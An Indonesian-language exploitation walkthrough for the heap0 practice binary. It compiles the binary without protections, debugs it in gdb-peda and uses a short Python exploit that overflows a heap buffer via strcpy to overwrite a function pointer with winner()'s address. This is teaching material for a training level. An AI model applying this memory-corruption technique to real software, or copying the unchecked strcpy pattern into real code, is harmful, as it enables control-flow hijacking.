# HEAP OVERFLOW
##A. COMPILE 

	gcc heap0.c -m32 -w -g -no-pie -z execstack -o heap0
	
##B. JALANKAN PROGRAM heap0
	./heap0 AAAAAAAAAAAAAAAAAAAAAAAAA
	data is at 0x97e5160, fp is at 0x97e51b0
	level has not been passed

AAAAAAAAAA  argument yang kita berikan, ini bertujuan untuk melakukan overflow pada program *heap0*

##C. ANALISA CODE

#### 1. analisa code 
	
		void winner() // fungsi yang akan kita take over
		{
		 	printf("level passed\n");
		}

		void nowinner() // fungsi yang akan selalu  di eksekusi
		{
		 	printf("level has not been passed\n");
		}

		int main(int argc, char **argv)
		{
			 struct data *d;
			 struct fp *f;

			 d = malloc(sizeof(struct data)); // memory allocation
			 f = malloc(sizeof(struct fp));
			 f->fp = nowinner;

			 printf("data is at %p, fp is at %p\n", d, f);

			 strcpy(d->name, argv[1]); // argument AAAA... yang kita masukan

			 f->fp(); // selalu memanggil fungsi nowinner

		}
		
#### 1. debug program
	
	// debug dengan gdb
	gdb ./heap0

	// disasembele main 
	gdb-peda$ pdisass  main
	Dump of assembler code for function main:
	0x080491ec <+0>:	lea    ecx,[esp+0x4]
	0x080491f0 <+4>:	and    esp,0xfffffff0
	0x080491f3 <+7>:	push   DWORD PTR [ecx-0x4]
	0x080491f6 <+10>:	push   ebp
	0x080491f7 <+11>:	mov    ebp,esp
	0x080491f9 <+13>:	push   esi
	0x080491fa <+14>:	push   ebx
	0x080491fb <+15>:	push   ecx
	0x080491fc <+16>:	sub    esp,0x1c
	0x080491ff <+19>:	call   0x80490d0 <__x86.get_pc_thunk.bx>
	0x08049204 <+24>:	add    ebx,0x2dfc
	0x0804920a <+30>:	mov    esi,ecx
	0x0804920c <+32>:	sub    esp,0xc
	0x0804920f <+35>:	push   0x40
	0x08049211 <+37>:	call   0x8049050 <malloc@plt>
	0x08049216 <+42>:	add    esp,0x10
	0x08049219 <+45>:	mov    DWORD PTR [ebp-0x20],eax
	0x0804921c <+48>:	sub    esp,0xc
	0x0804921f <+51>:	push   0x4
	0x08049221 <+53>:	call   0x8049050 <malloc@plt>
	0x08049226 <+58>:	add    esp,0x10
	0x08049229 <+61>:	mov    DWORD PTR [ebp-0x1c],eax
	0x0804922c <+64>:	mov    eax,DWORD PTR [ebp-0x1c]
	0x0804922f <+67>:	lea    edx,[ebx-0x2e3f]
	0x08049235 <+73>:	mov    DWORD PTR [eax],edx
	0x08049237 <+75>:	sub    esp,0x4
	0x0804923a <+78>:	push   DWORD PTR [ebp-0x1c]
	0x0804923d <+81>:	push   DWORD PTR [ebp-0x20]
	0x08049240 <+84>:	lea    eax,[ebx-0x1fd1]
	0x08049246 <+90>:	push   eax
	0x08049247 <+91>:	call   0x8049030 <printf@plt>
	0x0804924c <+96>:	add    esp,0x10
	0x0804924f <+99>:	mov    eax,DWORD PTR [esi+0x4]
	0x08049252 <+102>:	add    eax,0x4
	0x08049255 <+105>:	mov    edx,DWORD PTR [eax]
	0x08049257 <+107>:	mov    eax,DWORD PTR [ebp-0x20]
	0x0804925a <+110>:	sub    esp,0x8
	0x0804925d <+113>:	push   edx
	0x0804925e <+114>:	push   eax
	0x0804925f <+115>:	call   0x8049040 <strcpy@plt>
	0x08049264 <+120>:	add    esp,0x10
	0x08049267 <+123>:	mov    eax,DWORD PTR [ebp-0x1c]
	0x0804926a <+126>:	mov    eax,DWORD PTR [eax]
	0x0804926c <+128>:	call   eax
	0x0804926e <+130>:	mov    eax,0x0
	0x08049273 <+135>:	lea    esp,[ebp-0xc]
	0x08049276 <+138>:	pop    ecx
	0x08049277 <+139>:	pop    ebx
	0x08049278 <+140>:	pop    esi
	0x08049279 <+141>:	pop    ebp
	0x0804927a <+142>:	lea    esp,[ecx-0x4]
	0x0804927d <+145>:	ret    
	End of assembler dump.
	
	// taruh breakpoint pada alamet memory yang selalu memanggil funsi no winner  0x0804926c <+128>:call   eax
	gdb-peda$ break *0x0804926c
	Breakpoint 1 at 0x804926c: file heap0.c, line 38.
	gdb-peda$ 


jalankan dengan r AAAAAAAAAAAAAAAAA

	gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAA
	Starting program: /home/rwx/0day/SK/heap/heap0 AAAAAAAAAAAAAAAAAAAAAAAA
	data is at 0x804d160, fp is at 0x804d1b0

	[----------------------------------registers-----------------------------------]
	EAX: 0x80491c1 (<nowinner>:	push   ebp)
	EBX: 0x804c000 --> 0x804bf0c --> 0x1 
	ECX: 0xffffcf70 ("AAAAAA")// argument yang kita masukan
	EDX: 0x804d172 ("AAAAAA")
	ESI: 0xffffcc70 --> 0x2 
	EDI: 0xf7f8fe24 --> 0x1d8d2c 
	EBP: 0xffffcc58 --> 0x0 
	ESP: 0xffffcc30 --> 0xf7f903bc --> 0xf7f911c0 --> 0x0 
	EIP: 0x804926c (<main+128>:	call   eax) // EIP akan kita overwrite
	EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
	[-------------------------------------code-------------------------------------]
	   0x8049264 <main+120>:	add    esp,0x10
	   0x8049267 <main+123>:	mov    eax,DWORD PTR [ebp-0x1c]
	   0x804926a <main+126>:	mov    eax,DWORD PTR [eax]
	=> 0x804926c <main+128>:	call   eax //fungsi main
	   0x804926e <main+130>:	mov    eax,0x0
	   0x8049273 <main+135>:	lea    esp,[ebp-0xc]
	   0x8049276 <main+138>:	pop    ecx
	   0x8049277 <main+139>:	pop    ebx
	No argument
	[------------------------------------stack-------------------------------------]
	0000| 0xffffcc30 --> 0xf7f903bc --> 0xf7f911c0 --> 0x0 
	0004| 0xffffcc34 --> 0x40000 
	0008| 0xffffcc38 --> 0x804d160 ('A' <repeats 24 times>)
	0012| 0xffffcc3c --> 0x804d1b0 --> 0x80491c1 (<nowinner>:	push   ebp) // fungsi nowinner sudah terdaftar pada base pointer
	0016| 0xffffcc40 --> 0x2 
	0020| 0xffffcc44 --> 0xffffcd04 --> 0xffffcf41 ("/home/rwx/0day/SK/heap/heap0")
	0024| 0xffffcc48 --> 0xffffcd10 --> 0xffffcf77 ("XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0")
	0028| 0xffffcc4c --> 0xffffcc70 --> 0x2 
	[------------------------------------------------------------------------------]
	Legend: code, data, rodata, value

	Breakpoint 1, main (argc=0x2, argv=0xffffcd04) at heap0.c:38
	38		 f->fp(); // berhenti pada break point kita 
	gdb-peda$ 
	
	
cek memory mappings

	gdb-peda$ info  proc  mappings 
	process 5593
	Mapped address spaces:

		Start Addr   End Addr       Size     Offset objfile
		 0x8048000  0x804b000     0x3000        0x0 /home/rwx/0day/SK/heap/heap0
		 0x804b000  0x804c000     0x1000     0x2000 /home/rwx/0day/SK/heap/heap0
		 0x804c000  0x804d000     0x1000     0x3000 /home/rwx/0day/SK/heap/heap0
		 0x804d000  0x806f000    0x22000        0x0 [heap] // heap memory
		0xf7db7000 0xf7f8d000   0x1d6000        0x0 /usr/lib32/libc-2.28.so
		0xf7f8d000 0xf7f8e000     0x1000   0x1d6000 /usr/lib32/libc-2.28.so
		0xf7f8e000 0xf7f90000     0x2000   0x1d6000 /usr/lib32/libc-2.28.so
		0xf7f90000 0xf7f91000     0x1000   0x1d8000 /usr/lib32/libc-2.28.so
		0xf7f91000 0xf7f96000     0x5000        0x0 
		0xf7fcf000 0xf7fd2000     0x3000        0x0 [vvar]
		0xf7fd2000 0xf7fd4000     0x2000        0x0 [vdso]
		0xf7fd4000 0xf7ffb000    0x27000        0x0 /usr/lib32/ld-2.28.so
		0xf7ffc000 0xf7ffd000     0x1000    0x27000 /usr/lib32/ld-2.28.so
		0xf7ffd000 0xf7ffe000     0x1000    0x28000 /usr/lib32/ld-2.28.so
		0xfffdc000 0xffffe000    0x22000        0x0 [stack]
	gdb-peda$ vmmap 
	Start      End        Perm	Name
	0x08048000 0x0804b000 r-xp	/home/rwx/0day/SK/heap/heap0
	0x0804b000 0x0804c000 r-xp	/home/rwx/0day/SK/heap/heap0
	0x0804c000 0x0804d000 rwxp	/home/rwx/0day/SK/heap/heap0
	0x0804d000 0x0806f000 rwxp	[heap] // heap memory
	0xf7db7000 0xf7f8d000 r-xp	/usr/lib32/libc-2.28.so
	0xf7f8d000 0xf7f8e000 ---p	/usr/lib32/libc-2.28.so
	0xf7f8e000 0xf7f90000 r-xp	/usr/lib32/libc-2.28.so
	0xf7f90000 0xf7f91000 rwxp	/usr/lib32/libc-2.28.so
	0xf7f91000 0xf7f96000 rwxp	mapped
	0xf7fcf000 0xf7fd2000 r--p	[vvar]
	0xf7fd2000 0xf7fd4000 r-xp	[vdso]
	0xf7fd4000 0xf7ffb000 r-xp	/usr/lib32/ld-2.28.so
	0xf7ffc000 0xf7ffd000 r-xp	/usr/lib32/ld-2.28.so
	0xf7ffd000 0xf7ffe000 rwxp	/usr/lib32/ld-2.28.so
	0xfffdc000 0xffffe000 rwxp	[stack]
	gdb-peda$ 
	
dump data pada heap memory

	gdb-peda$ x/120x 0x0804d000
	............. 		.................
	0x804d120:	0x0000000000000000	0x0000000000000000
	0x804d130:	0x0000000000000000	0x0000000000000000
	0x804d140:	0x0000000000000000	0x0000000000000000
	0x804d150:	0x0000000000000000	0x0000005100000000
	0x804d160:	0x4141414141414141	0x4141414141414141 // argumen A yang kita inputkan | 41 adalah hexa dari A0x804926c
	0x804d170:	0x4141414141414141	0x0000000000000000
	0x804d180:	0x0000000000000000	0x0000000000000000
	0x804d190:	0x0000000000000000	0x0000000000000000
	0x804d1a0:	0x0000000000000000	0x0000001100000000
	0x804d1b0:	0x00000000080491c1	0x0000041100000000
	0x804d1c0:	0x2073692061746164	0x3430387830207461
	0x804d1d0:	0x7066202c30363164	0x3020746120736920
	0x804d1e0:	0x3062316434303878	0x000000000000000a
	0x804d1f0:	0x0000000000000000	0x0000000000000000
	0x804d200:	0x0000000000000000	0x0000000000000000

	gdb-peda$ 


jarak antara memory  0x804d160 ke 0x804d1b0 adalah 80 kita bisa melakukan overwrite pada eip dengan alaman memory addres winner 

disassamble winner

	gdb-peda$ pdisass  winner
	Dump of assembler code for function winner:
	   0x08049196 <+0>:	push   ebp
	   0x08049197 <+1>:	mov    ebp,esp
	   0x08049199 <+3>:	push   ebx
	   0x0804919a <+4>:	sub    esp,0x4
	   0x0804919d <+7>:	call   0x804927e <__x86.get_pc_thunk.ax>
	   0x080491a2 <+12>:	add    eax,0x2e5e
	   0x080491a7 <+17>:	sub    esp,0xc
	   0x080491aa <+20>:	lea    edx,[eax-0x1ff8]
	   0x080491b0 <+26>:	push   edx
	   0x080491b1 <+27>:	mov    ebx,eax
	   0x080491b3 <+29>:	call   0x8049060 <puts@plt>
	   0x080491b8 <+34>:	add    esp,0x10
	   0x080491bb <+37>:	nop
	   0x080491bc <+38>:	mov    ebx,DWORD PTR [ebp-0x4]
	   0x080491bf <+41>:	leave  
	   0x080491c0 <+42>:	ret    
	End of assembler dump.


create exploit.py

	#!/usr/bin/python2

	# Dump of assembler code for function winner:
	#    0x08049196 <+0>:	push   ebp
	#    0x08049197 <+1>:	mov    ebp,esp
	#    0x08049199 <+3>:	push   ebx
	#    0x0804919a <+4>:	sub    esp,0x4
	#    0x0804919d <+7>:	call   0x804927e <__x86.get_pc_thunk.ax>
	#    0x080491a2 <+12>:	add    eax,0x2e5e
	#    0x080491a7 <+17>:	sub    esp,0xc
	#    0x080491aa <+20>:	lea    edx,[eax-0x1ff8]
	#    0x080491b0 <+26>:	push   edx
	#    0x080491b1 <+27>:	mov    ebx,eax
	#    0x080491b3 <+29>:	call   0x8049060 <puts@plt>
	#    0x080491b8 <+34>:	add    esp,0x10
	#    0x080491bb <+37>:	nop
	#    0x080491bc <+38>:	mov    ebx,DWORD PTR [ebp-0x4]
	#    0x080491bf <+41>:	leave  
	#    0x080491c0 <+42>:	ret    
	# End of assembler dump.


	data = 'A' * 80
	winnerAddr = '\x96\x91\x04\x08'    # 0x08049196 <+0>:	push   ebp
	print data+winnerAddr
	
	
chmod 755 exploit.py

	[rwx dir ~/0day/SK/heap ]$ ./heap0 $(./exploit.py)
	data is at 0x8b46160, fp is at 0x8b461b0
	level passed  // level pass execute
	[rwx dir ~/0day/SK/heap ]$ 
	
	
	
	
#####Rahmat Wahyu Hadi | IG @r.wahyu | LINE : @rahmatwahyuhadi
	 ~~~~~~~~~~~~